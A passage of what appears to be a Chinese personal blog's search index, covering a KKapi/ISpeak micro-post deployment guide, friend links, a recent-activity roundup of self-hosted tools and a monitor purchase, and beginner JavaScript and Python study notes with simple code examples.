id，因为自己在页面中测试时，说说评论请求的地址格式也是根据 37 行代码这个进行请求查询的。 ","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:4:0","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#前端部署"},{"categories":["瞎折腾"],"content":"\rGithub 登陆验证（可选*）可以发布仅登陆可见的说说，但是需要配置 Github app。 参考项目文档创建 app ，其中填写的 speak 页面路径就是 ISpeak 所在的博客路径 创建以后拥有了 Client ID 和 Client Secrets，这两项需要填写在 kkapi 后端部署的 local.env 配置中。 在 kkapi 的后端界面个人设置中填写 GitHubId 。获得方法访问 github 提供的接口 https://api.github.com/users/\u003cYour UserName\u003e注意替换尖括号整体为你github的用户名，不是昵称。 在前端页面的 speak 初始化中添加两个属性 js ispeak.init({ ... speakPage：\"/shuoshuo/\", //这里是说说的页面路径，对应于 github app 中填写的 speak 页面路径（用双引号括起来，我不知道为啥单引号不行） githubClientId: 'Iv1.*******', //github app 的 Client ID ... })\r然后就可以在你的说说下面找到一个 Github 授权登陆。 ","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:5:0","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#github-登陆验证可选"},{"categories":["瞎折腾"],"content":"\r完工说说还支持 markdown 格式的图片插入，看起来更好用了，给作者点个赞。 ","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:6:0","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#完工"},{"categories":null,"content":"\r懒狗\rBraindance\r为世界上所有的美好而战 ","date":"2022-09-10","objectID":"/friend/:1:0","series":null,"tags":null,"title":"友链","uri":"/friend/#懒狗"},{"categories":null,"content":"\r主题作者\rPCloud\rThis is PCloud~💤 ","date":"2022-09-10","objectID":"/friend/:2:0","series":null,"tags":null,"title":"友链","uri":"/friend/#主题作者"},{"categories":null,"content":"\r友情链接\r小冰博客\r做个有梦想的人！ 小嘉的部落格 一个爱折腾的Java开发工程师 钝悟 ◾ Dunwu 大道至简，知易行难 Bore's Notes\r博观而约取，厚积而薄发。 LyShark - 孤风洗剑\r道，可道，非常道；名，可名，非常名。—— 老子《道德经》 ","date":"2022-09-10","objectID":"/friend/:3:0","series":null,"tags":null,"title":"友链","uri":"/friend/#友情链接"},{"categories":null,"content":"\r交换友链想互换友链就留言吧～格式参考如下～ text name: Braindance link: https://www.penginman.com avatar: https://www.penginman.com/img/avatar.png descr: 为世界上所有的美好而战\r","date":"2022-09-10","objectID":"/friend/:4:0","series":null,"tags":null,"title":"友链","uri":"/friend/#交换友链"},{"categories":null,"content":"ipseak加载中\r","date":"2022-08-28","objectID":"/shuoshuo_del/:0:0","series":null,"tags":null,"title":"说说","uri":"/shuoshuo_del/#"},{"categories":null,"content":"为世界上所有的美好而战 ","date":"2022-08-28","objectID":"/about/:0:0","series":null,"tags":null,"title":"关于","uri":"/about/#"},{"categories":null,"content":"水一篇文章，写写最近干了啥 ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:0:0","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#"},{"categories":null,"content":"\rOnenav一直想找一个导航页的网站，自己天天用书签栏用的找不到太烦了。之前用过webstack主题的网站，本来是直接写源码上的，后来自己做了一个用js读配置文件加载的，但是加网站的时候要手改数据文件。 最后发现了正在用的导航页onenav OneNav是一款开源免费的书签（导航）管理程序，使用使用PHP + SQLite 3开发，界面简洁，安装简单，使用方便。OneNav可帮助你你将浏览器书签集中式管理，解决跨设备、跨平台、跨浏览器之间同步和访问困难问题，做到一处部署，随处访问。 这个程序提供了后台管理的面板，添加网站的时候也能自己识别网站的title和description，还提供了好几个主题。下面是我网站的一部分，总之用起来还挺不错 踩的坑：官方文档里只提供了两个网站，但是在演示站找到了五六个，官方也提供了主题的下载和配置，但是需要订阅服务一年19.9，因为我是白嫖怪，就自己去找源码了 baisu baisu-two Webstack 找到源码需要改主题的资源地址，主题默认使用的onenav的旧变量TEMPLATE text \u003cscript src=\"templates/\u003c?php echo TEMPLATE; ?\u003e/js/jquery-3.5.1.min.js\" type=\"text/javascript\" charset=\"utf-8\"\u003e\u003c/script\u003e\r最新版本已经不再使用配置文件中的TEMPLATE转而为$template存储，修改以后样式就正常加载了。 ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:1:0","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#onenav"},{"categories":null,"content":"\r域名一直因为没有一个com的域名感到遗憾，最近看间谍过家家，记得阿尼亚和玩偶玩过家家的时候，有一只企鹅的名字就叫：ペんぎんマン penginman并且pingin的日语发音和企鹅penguin相似。于是有了这个域名 www.penginman.com ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:2:0","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#域名"},{"categories":null,"content":"\rmdserver-webmdserver-web 简单的Linux面板,感谢BT.CN写出如此好的web管理软件。我一看到，就知道这是我一直想要的页面化管理方式。 复制了后台管理界面，按照自己想要的方式写了一版。 一个把宝塔面板样式照搬过来的Linux管理面板，感觉现在也不是特别成熟，但是其他面板也没有太顺手的，为什么不用宝塔面板，因为之前报过关于网传信息泄露问题，我就是洁癖精。 ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#mdserver-web"},{"categories":null,"content":"\r图床之前用过一个Chevereto的图床，但是在国内服务器上部署，然后不想域名备案，所以访问老有问题。心血来潮在github上搜到了这两个项目 Lsky Pro PicX ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:4:0","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#图床"},{"categories":null,"content":"\rLsky Pro这个主要发现支持对象存储，之前有篇文章说以后已经把网站的图片存到腾讯云COS了，所以用这个主要充当一个图床上传的工具，还加了一个本地存储策略随便存点东西。上传以后也是可以复制各种类型。 还可以在后台直接管理图片。具体的就看仓库的演示图吧。 ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:4:1","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#lsky-pro"},{"categories":null,"content":"\rPicX这个用来传一些不大重要的图片把，也算是能用，还是用github当图床的，只是jsdelivr国内经常挂，所以加了两个其他的CDN访问。 ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:4:2","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#picx"},{"categories":null,"content":"\r显示器开始觉得屏幕小了，也去换了个眼镜还是感觉不好使，上一个眼镜看东西已经有点白了，主要是打派找人太费劲了，而且已经研究生了，未来看文献也挺不错，打算奖励一个显示器爽爽。去网吧体验了一波27寸，又在网上恶补了一阵子知识，最后相中了AOC Q27G2S/D，趁着打折入了手，买东西的时候还发现京东太会了，我下了个单想看看哪个支付方式能再优惠点就取消，取消的时候选择了少用优惠券，弹出来的页面又领了50块大洋！！！😎😎😎又省一波。 到手送的一跟DP线，发现电脑没有口，只有一个HDMI和两个Mini DP，家里有一根HDMI的好像有问题，帧数高的时候就会花，又在网上买了一个Mini DP转DP，还是同一个快递员给我送的，快递员还认出来我了，怪不好意思的。 ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:5:0","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#显示器"},{"categories":null,"content":"\rMarkdown编辑器最近发现Typora老版本不能用了，而且官方出了正式版需要付费，就找另外找了几个软件： Notion 这个软件感觉用来每个段落排版比较不错，但是windows端是个网页的套壳，而且国内正常好像还访问不了，用过一阵子换了 Obsidian 也挺不错的软件，可以在多个文章直接加上双向链接，还有脑图什么的，而且开源的插件社区，但是就是因为功能太多了感觉有点复杂 MarkText 很清爽的一个界面，但是目前还没支持中文。 Joplin 最后选择用的。界面清爽、管理笔记也挺不错，主要发现了有可以自己部署私有云笔记，下一步折腾这个。 ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:6:0","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#markdown编辑器"},{"categories":null,"content":"\r软路由先放一个骚话生成器项目里的模板 快过年了，不要再讨论什么NAS、HTPC、OpenWrt之类的了。你带你的大机箱回到家并不能给你带来任何实质性作用，朋友们兜里掏出一大把钱吃喝玩乐，你默默的在家里摆弄你的破群晖。亲戚朋友吃饭问你收获了什么，你说我组了一个RAID 0的ALL IN ONE，亲戚们懵逼了，你还在心里默默嘲笑他们，笑他们不懂你的刮削器，不懂你的Auto Backup，也笑他们看爱奇艺还要忍受会员专属广告。你父母的同事都在说自己的子女一年的收获，儿子买了个房，女儿买了个车，姑娘升职加薪了，你的父母默默无言，说我的儿子装了个黑盒子，开起来嗡嗡响、家里电表走得越来越快了。 我感觉我要走前辈走过的路了，所以还有个念想就是整一个ALL IN ONE耍一耍，目前没有资金，看中了一个N5105的小主机标价888，等研究生发现工资了，整一个鼓捣鼓捣。 ","date":"2022-08-10","objectID":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/:7:0","series":null,"tags":null,"title":"近期总结","uri":"/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/#软路由"},{"categories":null,"content":"\r面向对象对象是引用类型和其他四种基本类型不同。JS中，可以将对象分为“内部对象”、“宿主对象”和“自定义对象”三种。 内部对象 js中的内部对象包括Array、Boolean、Date、Function、Global、Math、Number、Object、RegExp、String。 以及各种错误类对象，包括Error、EvalError、RangeError、ReferenceError、SyntaxError、TypeError。 其中Global和Math这两个对象又被称为“内置对象”，这两个对象在脚本程序初始化时被创建，不必实例化这两个对象。 宿主对象 宿主对象就是执行JS脚本的环境提供的对象。对于嵌入到网页中的JS来说，其宿主对象就是浏览器提供的对象，所以又称为浏览器对象，如IE、Firefox等浏览器提供的对象。不同的浏览器提供的宿主对象可能不同，即使提供的对象相同，其实现方式也大相径庭！这会带来浏览器兼容问题，增加开发难度。浏览器对象有很多，如Window和Document等等。 自定义对象 顾名思义，就是开发人员自己定义的对象。JS允许使用自定义对象，使JS应用及功能得到扩充 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#面向对象"},{"categories":null,"content":"\r对象字面量使用大括号直接创建object类型的对象 javascript var obj = { name:\"xxx\", age:12 }\r","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:1","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#对象字面量"},{"categories":null,"content":"\r函数对象函数也是一个对象，使用typeof检查一个函数对象返回的是function。创建函数对象的三个方法： 使用构造函数。返回的结果是一个包含代码的对象类型 javascript var fun1 = new Function(\"console.log('Hello World')\"); func1();\r声明函数，并调用 javascript function fun2(){ console.log('Hello World'); } func2();\r使用参数接受一个匿名函数。匿名函数可以进行输出，内容是函数整段代码 javascript var fun3 = function(){ console.log('Hello World'); } fun3();\r","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:2","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#函数对象"},{"categories":null,"content":"\r函数参数多余参数不会被赋值。 如果实参的数量少于形参的数量，则没有对应实参的形参是undefined。 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:3","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#函数参数"},{"categories":null,"content":"\r立即执行函数函数定义以后，立即执行，只会执行一次 javascript (function(a,b){ console.log(a+b); })(1,2);\r","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:4","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#立即执行函数"},{"categories":null,"content":"\r全局作用域直接编写在script标签中的JS代码都在全局作用域，在页面打开时创建，关闭页面时销毁，全局作用域中有一个全局对象window 在全局作用域中所有的变量都会作为window对象的属性保存 在全局作用域中的所有函数都会作为window对象的方法保存 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:5","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#全局作用域"},{"categories":null,"content":"\r变量声明提前变量的声明提前。使用var关键字声明变量，会在所有代码执行之前声明（但是不会赋值，赋值还需执行到代码） 函数的声明提前。使用函数声明形式创建的函数，会在代码执行之前就被创建。使用函数表达式形式创建的函数，不会被声明提前，所以不能再声明提前创建。 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:6","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#变量声明提前"},{"categories":null,"content":"\r函数作用域在函数中使用变量，如果函数为声明则会往上一层作用域找，直到找到全局作用域，如果都没有找到会报ReferenceError错误。每一次调用函数都会创建一个作用域，并且是独立互不影响的。 在局部函数中访问全局变量可以使用window对象。 在函数中，不使用var关键字声明的变量都会成为全局变量。 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:7","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#函数作用域"},{"categories":null,"content":"\rthis解释器在每次调用函数的时候都会传入一个隐含参数，这个隐含参数就是this对象，该对象称为函数的上下文对象，根据函数的调用方式不同，this指向的对象也不同：以函数形式调用时，this永远都是window；以对象方法形式调用时，this是对象本身。 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:8","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#this"},{"categories":null,"content":"\r跳过若干","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:9","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#跳过若干"},{"categories":null,"content":"\r构造函数构造函数和普通函数的区别就是调用方法不同，构造函数需要使用new关键词创建，并且构造函数的返回类型为Object类型。构造函数名通常为首字母大写。构造函数执行流程： 立刻创建一个新对象 将新对象（新建的那个对象）设置为对象中的this * 逐行执行代码 将新对象作为返回值 instanceof可以用来检查一个对象是否是一个类的实例。所有的对象都是Object的后代 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:10","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#构造函数"},{"categories":null,"content":"\r原型对象我们创建的每一个函数，构造器都会向方法中添加一个属性prototype，这个属性对应一个对象，这个对象就是原型对象。如果函数作为普通函数调用，原型对象没有任何作用；如果作为构造函数调用，会为该构造函数创建一个唯一的原型对象。 原型对象相当于一个类的公共区域，这个类的所有实例都能访问这个原型对象。不同的类拥有不同的原型对象。我们可以将类共有的属性或方法添加到其中。 javascript function Person(){ } Person.prototype.a=123; var per = new Person(); //per.__proto__ == Person.prototype console.log(per.a); //123 如果访问一个对象中的属性或方法，它会首先在自身中寻找，如果未找到则会去原型对象中寻找。原型对象也有原型，这是一个原型链。 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:11","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#原型对象"},{"categories":null,"content":"\r垃圾回收把不用的对象设置为null。详细以后填坑 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:12","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#垃圾回收"},{"categories":null,"content":"\rcall和applycall()和apply()是函数对象的一个调用方法，这两个方法都会调用函数执行。可以将一个对象指定为第一个参数，则该对象成为函数执行时的this。 其他区别：call方法可以将实参在对象之后依次传递；apply方法需要将参数封装到一个数组中传递 js function func(a,b){ console.log(a); console.log(b); } func.call(obj,2,3); func.apply(obj,[2,3]);\r","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:13","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#call和apply"},{"categories":null,"content":"\rargument对象调用函数时，浏览器每次都会传递两个隐含参数 函数上下文对象this 封装实参的argument对象 argument对象是一个类似数组的对象，可以通过索引操作，函数调用时的所有实参都会在argument中保存，即使不定义形参，也可以通过argument对象使用实参。 javascript function fun(){ console.log(argument instanceof Array); //false console.log(argument[1]); //true console.log(argument.lenght); //2 console.log(argument.callee) //会打印当前正在执行的函数对象 } fun('hello',true);\rcallee属性可以留意一下 ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:14","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#argument对象"},{"categories":null,"content":"\rDOMdocument object model ","date":"2022-07-01","objectID":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","series":null,"tags":null,"title":"Javascript学习笔记","uri":"/posts/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#dom"},{"categories":["学习笔记"],"content":"\r函数","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:1:0","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#函数"},{"categories":["学习笔记"],"content":"\r函数的参数可以使用可变参数def func(*args)，参数前面的*代表args是一个可变参数。 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:1:1","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#函数的参数"},{"categories":["学习笔记"],"content":"\r用模块管理函数每个文件代表一个模块，不同模块的函数命名可以相同，但是如果如下代码引用 python from module1 import foo from module2 import foo foo()\r程序会调用最后一个调用的foo函数。 如果导入模块中除了定义的函数以外有可执行的代码，则Python解释器在导入这个模块时就会执行这些代码。可以利用只有被Python解释器直接执行的模块的名字才是 __main__ 进行判断 python def foo(): pass # __name__是Python中一个隐含的变量它代表了模块的名字 # 只有被Python解释器直接执行的模块的名字才是__main__ if __name__ == '__main__': print('call foo()') foo()\r在其他模块再导入上述模块时，if条件中的语句就不会执行 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:1:2","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#用模块管理函数"},{"categories":["学习笔记"],"content":"\r变量作用域Python查找一个变量时会按照“局部作用域”、“嵌套作用域”、“全局作用域”和“内置作用域”的顺序进行搜索。内置作用域及python内置的标识符如：input、print、int。 可以使用global关键字来指示局部函数中的变量来自全局变量，nonlocal关键字表示变量来自外部嵌套函数内的变量 事实上，减少对全局变量的使用，也是降低代码之间耦合度的一个重要举措，同时也是对迪米特法则的践行。 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:1:3","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#变量作用域"},{"categories":["学习笔记"],"content":"\r字符串和常用数据结构","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:2:0","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#字符串和常用数据结构"},{"categories":["学习笔记"],"content":"\r字符串反斜杠\\用来转义。 \\后面可以跟八进制和六进制来表示字符，\\u68d2使用unicode字符编码表示字符。 如果不想使用\\转义，可以在字符串前加上字母r说明 python s1 = r'\\n\\\\hello, world!\\\\\\n' print(s1) # \\n\\\\hello, world!\\\\\\n\r使用+进行字符串拼接，使用*重复一个字符串的内容，in、not in来判断字符串中是否包含子串，[]、[:]用来切片运算。 字符串类型是一种结构化的、非标量类型，所以会有一系列的属性和方法。 字符串对象身上的常用的函数： len()；获取字符串长度 capitalize()；字符串首个字母大写的拷贝 title()；每个字符串单词首字母大写的拷贝 upper()；所有字符串大写的拷贝 find()；查找字串位置。未找到值为 -1 startswith()；以某字符开始。类似的有endswith() center(50,’*’)；将字符串以指定宽度居中，填充指定字符。类似的有rjust()、ljust() isdigit()；是否为数字构成 isalpha()；是否为字母构成 isalnum()；是否为数字字母构成 strip()；获取处理左右两侧空格后的拷贝 格式化输出字符串 使用%d、%s等占位符，并在字符串结尾使用%()列表对应。 字符串提供的format()方法。 Python 3.6以后提供了语法糖表示，在字符串前使用f。 python a,b = 5,10 print('%d * %d = %d' % (a, b, a * b)) print('{0} * {1} = {2}'.format(a, b, a * b)) print(f'{a} * {b} = {a * b}')\r","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:2:1","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#字符串"},{"categories":["学习笔记"],"content":"\r列表数值类型（int、float）是标量类型，列表（list）是一种结构化的、非标量类型。 可以使用下标的方式遍历列表元素，或者for循环遍历列表元素 python list = [1,2,3,4,5,6] //通过下标访问 for index in range(len(list)): print(list[index]) //遍历元素访问 for elem in list: print(elem) //使用enumerate()处理获得元素及其下标 for index, elem in enumerate(list1): print(index, elem)\renumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。 列表也可以使用+进行拼接，使用切片操作获得列表的复制。 sorted()函数返回列表进行排序后的备份，不会影响原来的列表，我们设计函数应该像 sorted 函数一样不产生副作用。可以设置关键字reverse=True使列表逆置，关键字key=len根据字符串长度进行排序 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:2:2","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#列表"},{"categories":["学习笔记"],"content":"\r生成式和生成器生成式表达式创建列表容器和生成器创建列表容器 python //用列表的生成表达式语法创建列表容器 //表达式生成的容器里面元素已经准备就绪，所以会耗费较多内存空间 f1 = [x ** 2 for x in range(1, 1000)] //下面的代码创建的不是一个列表而是一个生成器对象 //生成器会在使用时，经过运算获取数据，不占用额外空间，但是消耗时间 f2 = (x ** 2 for x in range(1, 1000))\r还可以使用关键字yield将一个普通函数改造成生成器函数，下面是使用生成器函数打印斐波那契数列的例子 python def fib(n): a, b = 0, 1 for _ in range(n): a, b = b, a + b yield a def main(): for val in fib(20): print(val) if __name__ == '__main__': main()\r","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:2:3","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#生成式和生成器"},{"categories":["学习笔记"],"content":"\r元组元组与列表类似也是一种容器数据类型，但是元素内的元素不可以被修改。 可以使用列表的方法访问元素，不能修改元组元素，但是可以引用新的元组，原来的元素就会被垃圾回收。 使用list()函数将元组转换成列表，使用tuple()函数将列表转换成元组。 为什么要用元组？ 元组可以在多线程环境中保证对象状态不会被修改，一个不变对象自动就是线程安全的，这样就可以省掉处理同步化的开销。 元组在创建时间和占用的空间上面都优于列表。 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:2:4","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#元组"},{"categories":["学习笔记"],"content":"\r集合集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。 如果定义集合时有重复元素会被剔除；集合可以添加删除元素； 集合的成员进行交集（\u0026）、并集、差集等运算。例 python set1 = {1, 2, 3, 3, 3, 2} # 集合的交集、并集、差集、对称差运算 print(set1 \u0026 set2) # print(set1.intersection(set2)) print(set1 | set2) # print(set1.union(set2)) print(set1 - set2) # print(set1.difference(set2)) print(set1 ^ set2) # print(set1.symmetric_difference(set2)) # 判断子集和超集 print(set2 \u003c= set1) # print(set2.issubset(set1)) print(set3 \u003c= set1) # print(set3.issubset(set1)) print(set1 \u003e= set2) # print(set1.issuperset(set2)) print(set1 \u003e= set3) # print(set1.issuperset(set3))\r","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:2:5","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#集合"},{"categories":["学习笔记"],"content":"\r字典字典可以存储任何数据类型，每一个元素都为一个键一个值的key:value格式。 python dic1={'筑基丹': 1100, '元灵精华': 900, '磐龙宝剑': 11000} # 创建字典的构造器语法 items1 = dict(one=1, two=2, three=3, four=4) # 通过zip函数将两个序列压成字典 items2 = dict(zip(['a', 'b', 'c'], '123')) # 对字典中所有键值对进行遍历 for key in dic1: print(f'{key}: {dic1[key]}') # get方法也是通过键获取对应的值但是可以设置默认值 print(scores.get('神农鼎', 60))\r","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:2:6","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#字典"},{"categories":["学习笔记"],"content":"\r面向对象编程比较正式的说法 “把一组数据结构和处理它们的方法组成对象（object），把相同行为的对象归纳为类（class），通过类的封装（encapsulation）隐藏内部细节，通过继承（inheritance）实现类的特化（specialization）和泛化（generalization），通过多态（polymorphism）实现基于对象类型的动态分派。” python中使用class关键字定义类，然后在类中定义属性和方法 python class Student(object): # __init__是一个特殊方法用于在创建对象时进行初始化操作 # 通过这个方法我们可以为学生对象绑定name和age两个属性 def __init__(self, name, age): self.name = name self.age = age def study(self, course_name): print('%s正在学习%s.' % (self.name, course_name)) def main(): stu1 = Student('大卫',18) stu1.study()\r在python中可以给对象的属性或方法添加访问权限，就像Java中的私有属性，可以在属性或方法前添加双下划线__表示改方法是私有的，并且调用对象的属性或方法时会报'XXX' object has no attribute '__xx'的错误。 但是Python并没有从语法上保护属性或方法的私密性，如果知道更换名字的规则仍然可以访问到它们，如 Python class Test: def __init__(self, foo): self.__foo = foo def __bar(self): print(self.__foo) print('__bar') def main(): test = Test('hello') test._Test__bar() print(test._Test__foo) if __name__ == \"__main__\": main()\r之所以这样设定，可以用这样一句名言加以解释，就是\"We are all consenting adults here\"。因为绝大多数程序员都认为开放比封闭要好，而且程序员要自己为自己的行为负责。实际开发过程中Python程序员会遵循一种命名习惯就是让属性以单下划线开头表示属性是受保护的，其他类访问这样的属性时应该慎重，这种做法并不是语法上的规则，而是一种隐喻。 作者踩过的坑《Python - 那些年我们踩过的那些坑》。 面向对象的支柱 ：封装、继承、多态。 封装的感觉有点像webapi ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:3:0","series":null,"tags":null,"title":"Python-Day-100 